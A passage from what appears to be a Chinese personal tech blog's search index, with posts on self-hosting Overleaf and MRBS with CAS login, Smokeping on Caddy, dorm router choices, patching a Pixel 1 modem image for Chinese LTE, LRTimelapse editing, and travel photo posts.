service@cra.moe. .row-spaced(ng-show=\u0026#34;users.length \u0026gt; 0\u0026#34;).ng-cloak.text-success p We\u0026#39;ve sent out welcome emails to the registered users. p This page only allows email ends with edu.cn to register. p If you use other email address ends with other domain, please contact service@cra.moe . p (Password reset tokens will expire after one week and the user will need registering again). hr(ng-show=\u0026#34;users.length \u0026gt; 0\u0026#34;).ng-cloak table(ng-show=\u0026#34;users.length \u0026gt; 0\u0026#34;).table.table-striped.ng-cloak tr th #{translate(\u0026#34;email\u0026#34;)} th Set Password Url tr(ng-repeat=\u0026#34;user in users\u0026#34;) td {{ user.email }} td(style=\u0026#34;word-break: break-all;\u0026#34;) {{ user.setNewPasswordUrl }} 最后退出shell，然后使用docker restart sharelatex重启container之后，上述功能就会被应用了。\nimage.png 添加Google Analytics（可选） 在/var/www/sharelatex/web/app/views/layout.pug中插入脚本：\nscript(async=\u0026#39;\u0026#39;, src=\u0026#39;https://www.googletagmanager.com/gtag/js?id=G-SSYEP475F4\u0026#39;) script(async=\u0026#39;\u0026#39;, src=\u0026#39;/js/gtag.js\u0026#39;) 将Google Analytics执行的脚本放在/var/www/sharelatex/web/public/js/gtag.js中：\nwindow.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag(\u0026#39;js\u0026#39;, new Date()); gtag(\u0026#39;config\u0026#39;, \u0026#39;G-XXXXXXXX\u0026#39;); 这样配置后，每次加载页面时，上述的Google Analytics脚本均会执行。\n经过上面的魔改，一个比较科学的 Overleaf 服务就搭起来了。\n","permalink":"https://blog.sparktour.me/posts/2021/04/02/self-host-overleaf/","summary":"\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://i.loli.net/2021/04/02/seHpoXTqxc9OvWg.png\" alt=\"image.png\"  /\u003e\n    \u003cfigcaption\u003eimage.png\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003e迫于大学对$LaTeX$排版软件的需求，自己帮忙为所在的大学部署了\u003ca href=\"https://github.com/overleaf/toolkit\"\u003eOverleaf的社区版本\u003c/a\u003e，并配置了完整的宏包支持，\u003ca href=\"https://tex.stackexchange.com/questions/88740/what-does-shell-escape-do\"\u003eShell Escape （用于代码高亮宏包minted）\u003c/a\u003e与自助注册功能。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003cp\u003e以下配置步骤已在\u003ccode\u003esharelatex:2.6.1\u003c/code\u003e上成功测试。\u003c/p\u003e","title":"实践自部署Overleaf"},{"content":"最近帮助院系使用MRBS（Meeting Room Booking System）搭建了一个简单的会议室预约系统，并配置了Apereo CAS登陆。\n安装MRBS 前半部分主要参考的是MRBS的官方安装文档。\n从 https://sourceforge.net/projects/mrbs/files/ 下载MRBS，同时，需要保证机器上已经安装了nginx, mysql/mariadb, fcgiwrap , php-fpm, php-xml 和 php-curl。\n解压MRBS的压缩包。在本文中，MRBS被安装在了/var/www/mrbs/中。\n创建数据库，根据官方文档，需要在MySQL中创建MRBS有关的数据表（PostgreSQL的情况类似，见文档）：\nmysqladmin create mrbs mysql mrbs \u0026lt; tables.my.sql 修改web文件夹中的配置文件config.inc.php：\n\u0026lt;?php // -*-mode: PHP; coding:utf-8;-*- namespace CCSE; //填写MRBS网页的名字 /************************************************************************** * MRBS Configuration File * Configure this file for your site. * You shouldn\u0026#39;t have to modify anything outside this file. * * This file has already been populated with the minimum set of configuration * variables that you will need to change to get your system up and running. * If you want to change any of the other settings in systemdefaults.inc.php * or areadefaults.inc.php, then copy the relevant lines into this file * and edit them here. This file will override the default settings and * when you upgrade to a new version of MRBS the config file is preserved. * * NOTE: if you include or require other files from this file, for example * to store your database details in a separate location, then you should * use an absolute and not a relative pathname. **************************************************************************/ /********** * Timezone **********/ // The timezone your meeting rooms run in. It is especially important // to set this if you\u0026#39;re using PHP 5 on Linux. In this configuration // if you don\u0026#39;t, meetings in a different DST than you are currently // in are offset by the DST offset incorrectly. // // Note that timezones can be set on a per-area basis, so strictly speaking this // setting should be in areadefaults.inc.php, but as it is so important to set // the right timezone it is included here. // // When upgrading an existing installation, this should be set to the // timezone the web server runs in. See the INSTALL document for more information. // // A list of valid timezones can be found at http://php.net/manual/timezones.php // The following line must be uncommented by removing the \u0026#39;//\u0026#39; at the beginning $timezone = \u0026#34;Asia/Shanghai\u0026#34;; //设定时区 /******************* * Database settings ******************/ // Which database system: \u0026#34;pgsql\u0026#34;=PostgreSQL, \u0026#34;mysql\u0026#34;=MySQL $dbsys = \u0026#34;mysql\u0026#34;; //设定数据库类型 // Hostname of database server. For pgsql, can use \u0026#34;\u0026#34; instead of localhost // to use Unix Domain Sockets instead of TCP/IP. For mysql \u0026#34;localhost\u0026#34; // tells the system to use Unix Domain Sockets, and $db_port will be ignored; // if you want to force TCP connection you can use \u0026#34;127.0.0.1\u0026#34;. $db_host = \u0026#34;localhost\u0026#34;; // If you need to use a non standard port for the database connection you // can uncomment the following line and specify the port number $db_port = 3306; //端口 // Database name: $db_database = \u0026#34;mrbs\u0026#34;; //数据库名称 // Schema name. This only applies to PostgreSQL and is only necessary if you have more // than one schema in your database and also you are using the same MRBS table names in // multiple schemas. //$db_schema = \u0026#34;public\u0026#34;; // Database login user name: $db_login = \u0026#34;username\u0026#34;; // Database login password: $db_password = \u0026#39;password\u0026#39;; //登陆名和密码 // Prefix for table names. This will allow multiple installations where only // one database is available $db_tbl_prefix = \u0026#34;mrbs_\u0026#34;; //表前缀 // Set $db_persist to TRUE to use PHP persistent (pooled) database connections. Note // that persistent connections are not recommended unless your system suffers significant // performance problems without them. They can cause problems with transactions and // locks (see http://php.net/manual/en/features.persistent-connections.php) and although // MRBS tries to avoid those problems, it is generally better not to use persistent // connections if you can. $db_persist = FALSE; 配置nginx\nserver { listen 443 ssl http2; server_name mrbs.website.edu; root /var/www/mrbs/web; index index.php access_log /var/log/nginx/mrbs-access.log; error_log /var/log/nginx/mrbs-error.log; ssl_certificate cert.pem; ssl_certificate_key key.pem; location ~* \\.php$ { fastcgi_pass unix:/run/php/php7.4-fpm.sock; #php-fpm的位置需根据实际情况填写 include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SCRIPT_NAME $fastcgi_script_name; } } 在进行上述的配置之后，应该就可以正常访问MRBS的界面了。如果出现403等错误，可能需要\nchown -R www-data:www-data /var/www/mrbs/ 配置CAS CAS登陆是借助MRBS内置的phpCAS实现的。\n需要在config.inc.php加上以下的配置：\n//CAS $auth[\u0026#39;session\u0026#39;] = \u0026#39;cas\u0026#39;; $auth[\u0026#34;type\u0026#34;] = \u0026#34;cas\u0026#34;; //$auth[\u0026#39;cas\u0026#39;][\u0026#39;debug\u0026#39;] = true; //debug模式，如果需要自行开启 $auth[\u0026#34;admin\u0026#34;][] = \u0026#34;admin-username\u0026#34;; //之后如果从CAS登入这个username，它会被赋予管理员权限 include_once(\u0026#39;lib/CAS.php\u0026#39;); $auth[\u0026#39;cas\u0026#39;][\u0026#39;host\u0026#39;]=\u0026#39;cas.website.edu\u0026#39;; $auth[\u0026#39;cas\u0026#39;][\u0026#39;port\u0026#39;]= 443; $auth[\u0026#39;cas\u0026#39;][\u0026#39;context\u0026#39;]=\u0026#39;/cas\u0026#39;; //这里的路径是Apereo CAS的通用路径，每个机构可能会不一样。 $auth[\u0026#39;cas\u0026#39;][\u0026#39;ca_cert_path\u0026#39;]=\u0026#39;/var/www/mrbs/web/lets-encrypt-r3.pem\u0026#39;; //由于机构的CAS使用的证书是LE的，因此这里的证书是lets-encrypt-r3，具体情况需要根据cas服务器的证书具体讨论 配置Attribute（可选） 如果需要让MRBS现实将/var/www/mrbs/web/lib/CAS/Client.php里面的['phpCAS']['user']替换为['phpCAS']['attributes']['name']（根据实际情况修改）\n其他 如果配置CAS后尝试登陆报错，可以在配置文件里面加一行phpCAS::setDebug();，然后可以在/tmp/phpCAS.log里面找到详细的日志信息。\n参考资料 How to setup CAS login using the MRBS 1.7.1 release? （这个配置有问题，建议不要照抄） ","permalink":"https://blog.sparktour.me/posts/2021/01/27/install-mrbs-with-nginx-and-cas-authentication/","summary":"\u003cp\u003e最近帮助院系使用\u003ca href=\"https://mrbs.sourceforge.io/\"\u003eMRBS\u003c/a\u003e（Meeting Room Booking System）搭建了一个简单的会议室预约系统，并配置了Apereo CAS登陆。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch2 id=\"安装mrbs\"\u003e安装MRBS\u003c/h2\u003e\n\u003cp\u003e前半部分主要参考的是\u003ca href=\"https://mrbs.sourceforge.io/view_text.php?section=Documentation\u0026amp;file=INSTALL\"\u003eMRBS的官方安装文档\u003c/a\u003e。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e从 \u003ca href=\"https://sourceforge.net/projects/mrbs/files/\"\u003ehttps://sourceforge.net/projects/mrbs/files/\u003c/a\u003e 下载MRBS，同时，需要保证机器上已经安装了\u003ccode\u003enginx\u003c/code\u003e, \u003ccode\u003emysql/mariadb\u003c/code\u003e, \u003ccode\u003efcgiwrap \u003c/code\u003e, \u003ccode\u003ephp-fpm\u003c/code\u003e,  \u003ccode\u003ephp-xml\u003c/code\u003e 和 \u003ccode\u003ephp-curl\u003c/code\u003e。\u003c/p\u003e","title":"安装MRBS并配置CAS"},{"content":"观摩深圳地铁3号线高架区段维护 在2020年12月，笔者和同学报名参加了一次深圳地铁组织的地铁3号线高架区段维护观摩活动。以下是一些当时拍摄的照片。由于拍摄时间是地铁当天停运后的凌晨，所以许多图片的光线都比较暗。\n本文含有AVIF格式的图片，可能在较旧的Edge浏览器上无法正常显示。 售票机 到达布吉地铁站 自动售票机背面 自动售票机接线图 闸机 闸机登陆维护 车站设施 末班车 消防设备间 车站控制室（布吉站） 拟物化面板 信号控制显示 从控制室向外看 车站正在关门 没有显示信息的PIDS 轨行区 拍摄铁轨 放下轨道检测设备 轨道检测 远眺布吉站 「布吉」 轨道检测工作人员 轨道检测工人-2 轨道中间的疏散平台 轨道检测工人 「曲线半径」 到达木棉湾站 ","permalink":"https://blog.sparktour.me/posts/2020/12/20/visit-szmc-l3-maintenance/","summary":"在2020年12月，笔者和同学报名参加了一次深圳地铁组织的地铁3号线高架区段维护观摩活动。以下是一些当时拍摄的照片。由于拍摄时间是地铁当天停运后的凌晨，所以许多图片的光线都比较暗。","title":"观摩深圳地铁3号线高架区段维护"},{"content":"在 debian/ubuntu 上安装 Smokeping 时, apt 只会给一个用于 apache2 的配置. 并不能直接用于其他的 Web 服务器, 但迫于VPS上的用的 Web 服务器是 Caddy 因此就参考网上的资料整理出了给 Caddy 用的配置方法.\n首先需要安装 Smokeping ,并且 disable 掉安装时自带的 Apache2.\napt install smokeping systemctl stop apache2 systemctl disable apache2 还需要装一个fcgiwarp来处理到smokeping的请求,并且装完之后将它启动:\napt install fcgiwrap systemctl enable fcgiwrap.socket systemctl start fcgiwrap.socket 这时候应该能在 /var/run 里面看到 fcgiwrap.socket 这个文件了.\nCaddy不需要其他的插件就可以使用.\n之后查看一下smokeping的网页和cgi程序装在了哪里. 在这里它位于 /usr/share/smokeping 里面;图片缓存,js,css在 /usr/share/smokeping/www 里面.\n下面是 Caddy 的配置:\nsmokeping.example.com { root /usr/share/smokeping/www fastcgi / unix:/var/run/fcgiwrap.socket { env SCRIPT_FILENAME /usr/share/smokeping/smokeping.cgi } } smokeping.example.com/js { root /usr/share/smokeping/www/js } smokeping.example.com/css { root /usr/share/smokeping/www/css } smokeping.example.com/cache { root /var/cache/smokeping } smokeping.example.com/smokeping/images { root /usr/share/smokeping/www/images } 需要注意的是, fastcgi 下面对应的文件是 smokeping.cgi 而不是 www 里面的 smokeping.fcgi.dist , 以及图片也需要单独列一个路径,不然到时候可能无法显示监测的图片.\n配置完成 Smokeping 和 Caddy 之后, 可以先用 smokeping --debug 来测试一下smokeping能不能正常运行,如果能正常运行,此时访问 smokeping.example.com 应该就能正常进行网络监测了.\n配置完成之后 参考资料 Caddy Community 上的讨论 Archlinux Wiki 在网上找到的另一份 Caddy 配置,不过这是给 Arch 的,跟 Debian 系的安装路径什么的还不完全一样. ","permalink":"https://blog.sparktour.me/posts/2020/03/04/smokeping-with-caddy/","summary":"\u003cp\u003e在 debian/ubuntu 上安装 Smokeping 时, apt 只会给一个用于 apache2 的配置. 并不能直接用于其他的 Web 服务器, 但迫于VPS上的用的 Web 服务器是 Caddy 因此就参考网上的资料整理出了给 Caddy 用的配置方法.\u003c/p\u003e","title":"在 Ubuntu/Debian 配置 Smokeping 并使用 Caddy 作为服务器"},{"content":"马草垄行山——换个角度看深圳 自从港府在2016年大幅缩减了香港边境禁区的范围，深港边境的一些一些高地和旧的遗迹也迅速成为了旅游景点，但由于这些地方尚未完全开发，仍处于香港的“乡郊地带“，因此这些地方仍算是一个较为小众的景点。但正是因为香港侧的未开发地区和深圳的高楼形成了鲜明的对比，因此这里还是吸引了一些摄影爱好者的。\n整个行程大概需要花费3-4个小时（如果像我一样步行前往的话），沿途只有一个商店（我所见到的），如果可能请带足水和食物。\n这里有follow3me提供的地图，可以参考。(去程我是照着它走的)\n同时也建议下载Maps.me，在边境这一块，其提供的数据相比Google Maps会详细一些。\n从上水站出发 从上水的C出口出站，按照上面地图的路线沿河行走，过一会就能看到几根水管，这就是深港之间的供水管道。 water pipe 继续往北，应该就能看到深圳的一些楼宇了。（下图是梧桐河） 梧桐河 此时路段的右边应该是港铁的罗湖编组站和停车场，我前往的时候（2019.8）还能看到停泊在此处的东铁线新车。 罗湖停车场 罗湖编组站 过桥之后有一个小商店，可以买一些水（在别人的游记中他们也提到了这家商店的豆腐花很好吃🤣）。\n拍摄罗湖口岸 再往南走就到了梧桐河和深圳河的河口，按照地图有一个岔路，按照岔路走下去可以到达得月楼警岗。此处可以拍到罗湖口岸和港铁的罗湖站。**要注意的是梧桐河上和河的北侧都是禁区范围，以旅游身份进入（但不过境）是会被检控的。**所以我们只能在河边拍照了。 铁门 不准进入 返回主路之后再向西走500m左右就到了料壆村，如果是自驾前往车就需要暂时停在这里了。 LHV 上山 再往西走就是单车道的盘山路了，大概走十分钟左右可以看到一个路口，上面写着“用一波行驶”。从此处上山就能到达马草垄警岗了。 一波行驶 台阶 这一段路挺陡的。\n车道到头之后还有一段台阶，山顶上就是警岗了。但是目前警岗的位置是被围起来了的，要想去拍摄的地方需要从警岗外侧的一条小路绕过去，再往下走一些能到一个小山包的上面，就是最佳的拍摄点了。（想必已经有很多旅游者来过这里了，山包顶上的草已经被踩没了一些🤣）\n土路 在这里就能看到深圳的福田河罗湖区了，天气好的时候往西边望甚至可以看到天水围/屯门的楼房。\n罗湖 PANO 要注意的是，从离开料壆寸到上到山顶，香港和大陆的手机信号都会比较差（2G only）建议提前下载离线地图。\n到达山顶之后香港侧的信号还是只有2G，但山顶能够接收到大陆的移动，联通的4G信号的电信的3G信号。（而且速度还不错）\n返程 之前所看的游记上大都是坐巴士原路返回，但如果晚上要返回深圳的话，步行至新田交汇处再乘坐皇巴士返回也是一种方案。（当然如果走不动了的话，路上的红色小巴可以招手即停，能坐回到上水）\n此时建议使用maps.me来导航（这一段很多可以行走的路Google Maps上都没有显示出来）\nIMG_20190829_200220.jpg 经过展能运动村。\n一直沿大路走可以最终走到粉岭公路，再往西走就能到新田交汇处（如果走不动了还可以做78K直接去新田或者上水）\nIMG_20190829_203347.jpg 这一段路都是有人行道的，安全性还是有保证的。\n最后乘坐皇巴士即可返回深圳。 HG-LMC-bus ","permalink":"https://blog.sparktour.me/posts/2019/09/09/trip-to-border-of-sz-and-hk/","summary":"\u003ch1 id=\"马草垄行山换个角度看深圳\"\u003e马草垄行山——换个角度看深圳\u003c/h1\u003e\n\u003cp\u003e自从港府在2016年大幅\u003ca href=\"https://www.police.gov.hk/ppp_tc/11_useful_info/licences/remind.html\"\u003e缩减\u003c/a\u003e了香港边境禁区的范围，深港边境的一些一些高地和旧的遗迹也迅速成为了旅游景点，但由于这些地方尚未完全开发，仍处于香港的“乡郊地带“，因此这些地方仍算是一个较为小众的景点。但正是因为香港侧的未开发地区和深圳的高楼形成了鲜明的对比，因此这里还是吸引了一些摄影爱好者的。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003cp\u003e\u003cstrong\u003e整个行程大概需要花费3-4个小时（如果像我一样步行前往的话），沿途只有一个商店（我所见到的），如果可能请带足水和食物。\u003c/strong\u003e\u003c/p\u003e","title":"马草垄行山——换个角度看深圳"},{"content":"Hello World Again 整了一晚上，总算找到这款自己满意的主题了，也基本整理好了博客。 之前在wordpress上尝试过搭建有博客，但是放在wordpress总还是有些不太放心（因为是使用了GCE提供的免费额度搭建的，有被停机的风险）。现在host在GitHub Pages上这方面的问题应该就没有那么大了。 希望这个博客不止会记录关于技术的东西，还能记述一些别的东西（比如游记什么的hhh） 希望我能尽可能的保持一定的的更新频率（flag🤣）。\n这条线以下的内容是从wordpress站点自动导出的，可能会有一些排版错误，请见谅。\n","permalink":"https://blog.sparktour.me/posts/2019/09/08/hello-world-again/","summary":"\u003ch1 id=\"hello-world-again\"\u003eHello World Again\u003c/h1\u003e\n\u003cp\u003e整了一晚上，总算找到这款自己满意的主题了，也基本整理好了博客。\n之前在wordpress上尝试过搭建有博客，但是放在wordpress总还是有些不太放心（因为是使用了GCE提供的免费额度搭建的，有被停机的风险）。现在host在\u003ca href=\"https://github.io\"\u003eGitHub Pages\u003c/a\u003e上这方面的问题应该就没有那么大了。\n希望这个博客不止会记录关于技术的东西，还能记述一些别的东西（比如游记什么的hhh）\n希望我能尽可能的保持一定的的更新频率（flag🤣）。\u003c/p\u003e","title":"Hello World Again"},{"content":"进入了大学，每个同学都想要并需要一个高速，稳定的网络环境，因此选择路由器也就显得十分重要了。本文将会基于笔者之前的一些体验和网络上的文章和数据，推荐几款路由器，并补充一些大陆高校校园网的“技巧”。\n路由器的选择 首先，今天已经是2019年下半年了，在Wi-Fi6(802.11ax)路由器都已经发布的情况下，就不要听信“无良商家”的建议，购买陈旧的只有百兆网口或无线部分只有802.11n(2.4GHz)的路由器了。\n若要在现在购买一台路由器，笔者个人认为路由器应该满足以下的几个条件：\n接口： 路由器上的WAN和LAN接口应为千兆(GE)，最好是有4个LAN口+1个WAN口 可以但不必须：有一个或以上的USB/SD卡/SATA接口，如果需要拿路由器当NAS或还是挺方便的（速度和另说） 无线： 理论无线(Wi-Fi)速率应至少为1200Mbps(800Mbps-ac+400Mbps-n),如果有条件建议购买支持MU-MIMO的或者更进一步，直接购买1700Mbps或1900Mbps的拥有3*3天线路由器以适应学校的千兆内网（比1200Mbps的2*2天线多了一组）。需要注意的是，部分客户端设备只有2*2天线，这使路由器可能无法发挥其全部性能。 控制权（最重要的） 可以自主刷机（openwrt或其他客制系统），这几乎决定你的路由器能不能使用更多的高级功能。 对IPv6的支持（这点在校园网中还算比较重要） IPv6这一点基本上就可以把绝大多使用厂商自带固件的国产路由器排除在外（国产路由器厂商的固件极少有出厂支持IPv6的，不过也许在工信部发布了《关于开展2019年IPv6网络就绪专项行动的通知》后会有所好转，通知中明确要求了：\n“TP-LINK、D-LINK、华为、腾达、华硕、网件、小米等企业新生产的家庭路由器应支持IPv6，并向存量家庭路由器设备推送支持IPv6的固件版本。”）\n而TP-Link由于其使用了RTOS，并且其flash一般很小（2M-4M），难以刷入客制的基于Linux的固件，也无法像其他系统基于openwrt的厂商一样给路由器添加一些功能。（Mecury水星也一样，都是TP-Link的子品牌）\n华为的路由器由于硬件不开源，因此也难以或基本无法刷机。\n购买时建议避开上述品牌。\n如果按照价格区间进行划分，笔者推荐的路由器有以下几款（均满足上面所说的所有条件）：\n100元以下：别想了😂，考虑去捡个后面那些100+的路由器的漏吧😂。\n100-200元：这一价格区间能够买到的大都是使用MT7621A处理器的路由器，并且多位新兴互联网企业出品。\n不想折腾的话请考虑小米路由器4A千兆版（小米路由器3g的阉割版），1200M Wi-Fi+2*千兆LAN在宿舍中一般是够用的，官方也提到了6月份会为其升级支持IPv6的固件，小小的缺点是没有USB口和暂时没有第三方固件可刷。 Mi Wi-Fi 4A GBE Version Mi.com\n想折腾： 二手斐讯k2p（没有usb口） 二手联想NeWi-Fi3（有一个usb3.0口，2.4Ghz信号一般) 二手/存货小米路由器3g 斐讯k2p zhuanlan.zhihu.com\n小米路由器3g acwifi.net\nNeWiFi d2 openwrt.org\n200-400元：这个价位的全新机型大部分仍是MT7621A的处理器，但如果购买二手或是遇到打折，也许能购买到入门级的高端路由器（采用ARM芯片的）\n不想折腾：华硕ACRH17，拥有3*3无线天线，全千兆网口和华硕做的功能很全的固件，刷机也较为方便。（这款路由器只有在打折时会低于400元，其他时间的价格会略高于400元）\nArch17 store.asus.com\n想折腾： 二手的LinkSYS wrt1900ac或wrt1200ac，这两款路由器满足前面的一切要求，并且他们对三方固件openwrt极为友好。 网件R6800,可以刷入第三方固件开启160MHz带宽，达到本身千元级别路由器的速度。 wrt1900ac amazon.com\nNetgear R6800 www.netgear.co.uk\n（我想大学生应该不会购买500元以上的路由器🤣）\n到手之后 路由器到手之后，想要释放其完全的性能，必然是需要刷机的。\n部分路由器厂商（如小米）会设置一些限制或免责条款，使得路由器获得ssh的root权限后失去保修，这点其实并不如手机root后失去保修的影响大，毕竟路由器日常使用损坏的概率还是很低的。\n关于固件 路由器的客制固件选择也不少，大致分为适配硬件和平台最全的openwrt和更易上手的华硕固件（主要为适配MT7621路由器的Padavan固件）和其他的修改版本如koolshare等)。\n如果宿舍的网络环境较好（无需认证程序，网口已配置好IPv6\n），功能丰富上手快Padavan的固件或许更加合适，如果需要使用某些验证客户端才能上网或者网络结构比较复杂（需要多线接入等，则建议使用原生的openert进行修改（那些“官改“的snapshot版本在下载软件包时总会有一些问题）\nTODO 校园网下的IPv6配置 如何利用Cernet2 ","permalink":"https://blog.sparktour.me/posts/2019/07/19/e5-a4-a7-e5-ad-a6-e7-94-9f-e6-b4-bb-e6-8c-87-e5-8d-97-e5-a6-82-e4-bd-95-e9-80-89-e6-8b-a9-e9-80-82-e7-94-a8-e4-ba-8e-e5-af-9d-e5-ae-a4-e7-9a-84-e8-b7-af-e7-94-b1-e5-99-a8-e4-b8-8e-e5-90-88-e9-80-82/","summary":"\u003cp\u003e进入了大学，每个同学都想要并需要一个高速，稳定的网络环境，因此选择路由器也就显得十分重要了。本文将会基于笔者之前的一些体验和网络上的文章和数据，推荐几款路由器，并补充一些大陆高校校园网的“技巧”。\u003c/p\u003e","title":"大学生活指南-如何选择适用于寝室的路由器与合适的网络配置"},{"content":"自从pixel1开始，Google就不再把大陆运营商的lte配置文件内置在手机内了，在使用的过程中就会遇到不少麻烦：联通还能基本正常使用（但似乎配置文件不完整，信号会比较一般），但电信就无法直接使用lte了。\n最后参考了xda上的一种方法做到了在不Factory Resret的情况下（甚至OTA也不会失效）成功一次性启用和改善了三网的lte效果（理论上在Android O/P/Q beta上都可以成功）\n首先我们要用到pixel的factory image和其他的一台有大陆运营商配置的821机器的全量刷机包，这里选取一加3T（和pixel一样均为snapdragon821）\n下载pixel的factory image:\nhttps://developers.google.com/android/images#sailfish\n解压开image-sailfishxxxx.zip，再解压出里面的modem.img\n下载一加3T的全量OTA包\nhttps://www.oneplus.com/hk/support/softwareupgrade/details?code=4\n在/firmware-update/里找出NON-HLOS.bin，解压到别处\n再Linux环境下扩容pixel的modem.img使能有足够空间装入三大运营商的配置文件。\ndd if=/dev/zero of=modem.img bs=4096 count=300 conv=notrunc oflag=append #这样会扩容1.2M左右，运营商的配置文件大概占用了900k左右的空间 然后挂载上modem.img和NON-HLOS.bin\nsudo mount -o loop modem.img /dir_you_want_to_mount/pixel sudo mount -o loop NO-HLOS.bin /dir_you_want_to_mount/oneplus 再将NO-HLOS.bin中的china的整个配置文件夹拷贝到moden.img的相应位置：\nsudo cp -r /dir_you_want_to_mount/oneplus/image/modem_pr/mcfg/configs/mcfg_sw/generic/china/ /dir_you_want_to_mount/pixel/modem_pr/mcfg/configs/mcfg_sw/generic/ 最后还需要把配置文件中的版本号+1来让手机认为这是新配置而去读取：\nsudo vim modem/modem_pr/verinfo/ver_info.txt #打开后直接把里面的最后一位数字+1即可 保存并解除挂载\nsync umount pixel umount oneplus 把修改后的modem在fastboot下刷入\nfastboot flash modem_a modem.img fastboot flash modem_b modem.img fastboot reboot 重启之后开关一下飞行模式应该就可以使用了，具体拨号盘进*##4636##*即可看到：\n这里的data network type已经是LTE了\n参考：[GUIDE] Enable China Telecom LTE by modifying modem partitions\nhttps://forum.xda-developers.com/showpost.php?p=78525459\u0026amp;postcount=4\n⚠️注意，若是OTA到Android Q预览版时配置文件会似乎会失效（甚至会弄得联通都上不了网），需要重新来一遍上述操作\n","permalink":"https://blog.sparktour.me/posts/2019/05/11/enable-pixel-1-s-lte-in-ct-cmcc-cu-improve-signal-reliability-in-mainland-china-without-factory-reset-e6-97-a0-e9-9c-80-e6-81-a2-e5-a4-8d-e5-87-ba-e5-8e-82-e8-ae-be-e7-bd-ae-ef-bc-8c-e8-ae-a9pixel1/","summary":"\u003cp\u003e自从pixel1开始，Google就不再把大陆运营商的lte配置文件内置在手机内了，在使用的过程中就会遇到不少麻烦：联通还能基本正常使用（但似乎配置文件不完整，信号会比较一般），但电信就无法直接使用lte了。\u003c/p\u003e","title":"Enable Pixel 1 's lte in CT/CMCC/CU \u0026 Improve Signal Reliability in Mainland China Without Factory Reset 无需恢复出厂设置，让pixel1在大陆可用电信/联通/移动lte"},{"content":"教程:使用LRTimelapse制作平滑的延时\n自从有了gopro之后，他的用途一般就是拍摄延时。不过延时的后期处理一直是一件比较麻烦的事情，之前在知道这个软件之前我一直使用AfterEffects和Adobe的ACR来处理，但ACR只能修改序列的第一张图片，后面的图片就和只能沿用第一张图的设置，在处理亮度和色温大幅度变化的场景就很难兼顾全部的图片了。\n而**LRTimelapse**则比较好的做到了这“兼顾全部的场景”这一点，他能让用户在其中选择一些关键帧，在Lightroom中进行调整，再根据关键帧的调整参数对序列中所有图片的参数进行平滑的调整，最后写入每个文件的XMP中（ACR用于保存每个图片的的调整配置的文件），再用Lightroom就可以导出图像序列或是视频。\n软件需要安装Adobe DNG Converter软件安装后也会提示安装。\n首先先把需要处理的raw文件置于一个文件夹内，在LRTimelapse里打开到这个文件夹，选择Visual Workflow软件会自动开始分析每一张照片的大致亮度曲线\n选择一下key fram的数量，稍后也可以在文件第一列点选某张图片来指定它为关键帧\n在Lightroom里修改前面定义的关键帧\n之后reload一下让软件能够读取新的xmp数据\n点击Auto Transition和Image Preview，软件会重新计算修改后的亮度数据，并且会生成一个低分辨率的预览视频来确认参数是否合适（要是觉得慢，可以在file-settings里面调低预览分辨率）\n最后点击Visual Deflicker来生成平滑的调整曲线，这次调整完成后更改后的参数会被写回xmp中，最后回到Lightroom中，在file-export里选择用LRTimelapse导出，就可以导出图像序列了，如果要导出视频，LRTimelapse也提供了这个选项（甚至还可以导出422/444和广色域的视频）。\n","permalink":"https://blog.sparktour.me/posts/2019/05/02/lrtimelapse-a-better-way-to-create-a-smooth-time-lapse/","summary":"\u003cp\u003e教程:使用LRTimelapse制作平滑的延时\u003c/p\u003e\n\u003cp\u003e自从有了gopro之后，他的用途一般就是拍摄延时。不过延时的后期处理一直是一件比较麻烦的事情，之前在知道这个软件之前我一直使用AfterEffects和Adobe的ACR来处理，但ACR只能修改序列的第一张图片，后面的图片就和只能沿用第一张图的设置，在处理亮度和色温大幅度变化的场景就很难兼顾全部的图片了。\u003c/p\u003e","title":"LRTimelapse: A Better Way to Create a Smooth Time-Lapse"},{"content":" 使用PC/Apple HomeKit控制米家等智能家居 在大一上时购入了一台二手树莓派3b，但一般也只用来挂一下pt，当个下载机和简易nas使用。后来发现Home Assistant这个软件可以连接许多智能家庭平台，于是在绿米Aqura空调伴侣打折时入了一个。\n其实小米自己提供的米家app在功能上来说更加完善，不仅能设定更多的智能场景，还能通过公网控制设备，但想到小米系app一贯的作风（配置一个智能家居也强制需要读取识别码和位置权限\u0026hellip;），只在ipad上安装了一个，手机上的配置好就马上卸掉了😂。\n除了空调伴侣的功能，还可以当zigbee的网关和收音机用\n首先在手机上配置好空调伴侣，之后就可以在手机上获取给HA控制的token了（狂点“关于”的空白处就有了）\n会得到类似这样的东西：\nVersion no：245 网关ID：1XXXXXXXX Zigbee通道：20 网关信息： {\u0026quot;life\u0026quot;:2333,\u0026quot;cfg_time\u0026quot;:0,\u0026quot;token\u0026quot;:\u0026quot;xxxxtokenxxxxx\u0026quot;,\u0026quot;mac\u0026quot;:\u0026quot;AA:BB:CC:DD:EE:FF\u0026quot;,\u0026quot;fw_ver\u0026quot;:\u0026quot;1.4.1_156\u0026quot;,\u0026quot;hw_ver\u0026quot;:\u0026quot;MW300\u0026quot;,\u0026quot;model\u0026quot;:\u0026quot;lumi.acpartner.v3\u0026quot;,\u0026quot;mcu_fw_ver\u0026quot;:\u0026quot;0149\u0026quot;,\u0026quot;wifi_fw_ver\u0026quot;:\u0026quot;SD878x-14.76.36.p84-702.1.0-WM\u0026quot;,\u0026quot;ap\u0026quot;:{\u0026quot;rssi\u0026quot;:-34,\u0026quot;ssid\u0026quot;:\u0026quot;wifi-ssid\u0026quot;,\u0026quot;bssid\u0026quot;:\u0026quot;11:22:33:44:55:66\u0026quot;},\u0026quot;netif\u0026quot;:{\u0026quot;localIp\u0026quot;:\u0026quot;192.168.1.x\u0026quot;,\u0026quot;mask\u0026quot;:\u0026quot;255.255.255.0\u0026quot;,\u0026quot;gw\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;gw_mac\u0026quot;:\u0026quot;11:22:33:44:55:66\u0026quot;},\u0026quot;mmfree\u0026quot;:163096,\u0026quot;ot\u0026quot;:\u0026quot;otu\u0026quot;,\u0026quot;otu_stat\u0026quot;:[